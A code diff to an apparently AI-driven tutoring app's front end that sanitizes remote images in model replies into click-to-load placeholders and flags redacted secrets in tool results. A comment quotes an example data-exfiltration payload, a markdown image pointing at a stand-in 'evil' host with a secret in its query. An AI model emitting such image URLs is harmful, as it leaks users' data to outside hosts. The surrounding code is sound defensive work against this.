@@ -671,6 +671,58 @@
   DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
     if (data.attrName === 'style' && node.closest && (node.closest('.katex') || node.closest('svg'))) data.forceKeepAttr = true;
   });
+  // A remote image in a reply is a request the model chooses the URL of (`![](https://evil/?q=secret)`): nothing loads
+  // by itself. The sanitizer moves the URL to data-remote; a processor shows a placeholder with the host, and a click
+  // loads it through the app (`teacher-remote:`, https only). The page's CSP allows no http(s) images at all.
+  const LOCAL_IMG = /^(?:data:image\/|teacher-blob:|blob:)/i;
+  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+    const tag = node.nodeName.toLowerCase();
+    if (tag === 'img') {
+      node.removeAttribute('data-remote'); node.removeAttribute('srcset');
+      const src = (node.getAttribute('src') || '').trim();
+      if (src && !LOCAL_IMG.test(src)) { node.removeAttribute('src'); node.setAttribute('data-remote', src.slice(0, 2000)); }
+    } else if (tag === 'source') { node.removeAttribute('srcset'); node.removeAttribute('src'); }
+    else if (tag === 'image' || tag === 'use' || tag === 'feimage') {
+      for (const a of ['href', 'xlink:href']) { const v = (node.getAttribute(a) || '').trim(); if (v && !v.startsWith('#') && !LOCAL_IMG.test(v)) node.removeAttribute(a); }
+    }
+  });
+  function remoteHost(url) {
+    try { const u = new URL(url, 'https://x.invalid/'); return { u, host: u.host, secure: u.protocol === 'https:' && u.host !== 'x.invalid' }; } catch (e) { return null; }
+  }
+  // Images the learner chose to load this session: a re-render (streaming, paging, a theme change) shows them again.
+  const loadedRemote = new Set();
+  function remoteImg(h, alt, placeholder) {
+    const img = document.createElement('img');
+    img.alt = alt || '';
+    img.src = 'teacher-remote://img/?k=' + encodeURIComponent(window.__remoteKey) + '&u=' + encodeURIComponent(h.u.href);
+    if (placeholder) img.onerror = () => { placeholder.textContent = 'Image could not be loaded from ' + h.host; placeholder.removeAttribute('data-act'); img.replaceWith(placeholder); };
+    return img;
+  }
+  R.registerProcessor((root) => {
+    const list = Array.from(root.querySelectorAll ? root.querySelectorAll('img[data-remote]') : []);
+    if (root.matches && root.matches('img[data-remote]')) list.unshift(root);
+    for (const img of list) {
+      const url = img.getAttribute('data-remote'), h = remoteHost(url);
+      const b = document.createElement('span');
+      b.className = 'remote-img'; b.setAttribute('role', 'button'); b.tabIndex = 0;
+      if (h && h.secure) b.setAttribute('data-act', 'remote-img');
+      b.setAttribute('data-url', url);
+      b.title = url.slice(0, 300);
+      b.textContent = h ? (h.secure ? 'Image from ' + h.host + ' (click to load)' : 'Image not loaded (' + (h.host === 'x.invalid' ? 'not a web address' : 'not https: ' + h.host) + ')') : 'Image not loaded';
+      const alt = img.getAttribute('alt'); if (alt) b.setAttribute('aria-label', alt.slice(0, 200));
+      img.replaceWith(h && h.secure && window.__remoteKey && loadedRemote.has(h.u.href) ? remoteImg(h, alt, b) : b);
+    }
+  });
+  R.registerAction('remote-img', (el) => {
+    const url = el.getAttribute('data-url'), h = remoteHost(url);
+    if (!h || !h.secure || !window.__remoteKey) return;
+    loadedRemote.add(h.u.href);
+    el.replaceWith(remoteImg(h, el.getAttribute('aria-label'), el));
+  });
+  document.addEventListener('keydown', (e) => {
+    const el = e.target.closest && e.target.closest('.remote-img[data-act]');
+    if (el && (e.key === 'Enter' || e.key === ' ')) { e.preventDefault(); el.click(); }
+  });
   // Finished markdown is cached by content, so re-rendering a lesson (paging, a theme change, a card refresh) parses each
   // block once. The key carries the run outputs' count: a block's HTML gains its output when the learner runs it.
   const mdCache = new Cache(600, 6e6);
@@ -1227,6 +1279,8 @@
       '<div class="head" data-act="toggle-tool" data-focus="tool-head" role="button" tabindex="0" aria-expanded="' + open + '"><span class="icon">' + R.icon(d.icon || 'wrench') + '</span><span class="name">' + esc(title) + '</span>' +
       '<span class="sum">' + esc(summary) + '</span>' + acts + '<span class="state">' + state + '</span>' + R.icon('chevron-right', 'chev') + '</div>' +
       (why ? '<div class="why">' + esc(why) + '</div>' : '') +
+      // A key or token in a result never reaches the model; the learner is told it was held back.
+      (r && r.meta && Array.isArray(r.meta.redacted) && r.meta.redacted.length ? '<div class="why redacted">' + R.icon('shield') + ' Redacted before the model saw it: ' + esc(r.meta.redacted.join(', ')) + '</div>' : '') +
       '<div class="body">' + (open ? guard(b.name, () => (d.body || R.tools.default.body)(tn, ctx)) : '') + '</div></div>';   // bodies (up to 20k characters each) only when opened
     setHTML(node, html);
   }
